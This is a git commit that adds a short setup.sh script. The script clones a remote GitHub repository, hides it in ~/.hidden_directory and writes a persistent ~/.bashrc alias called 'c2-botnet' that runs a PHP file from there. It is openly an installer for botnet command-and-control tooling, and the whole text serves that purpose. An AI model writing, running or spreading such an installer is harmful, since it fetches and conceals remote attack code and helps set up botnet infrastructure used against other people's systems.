1853bcaf85c25ad495a213ae2bd77599b59200bc
NguyenDangBaHao <123958437+Bahao25100@users.noreply.github.com>
2024-02-25 20:38:30 +0700

    Add files via upload

---
+++ setup.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+git clone https://github.com/Bahao25100/NDBHAO
+mv NDBHAO ~/.hidden_directory
+echo 'alias c2-botnet="php ~/.hidden_directory/trum.php"' >> ~/.bashrc
+source ~/.bashrc
+echo " setup success \n"
+echo " you pls use command (c2-botnet) \n"
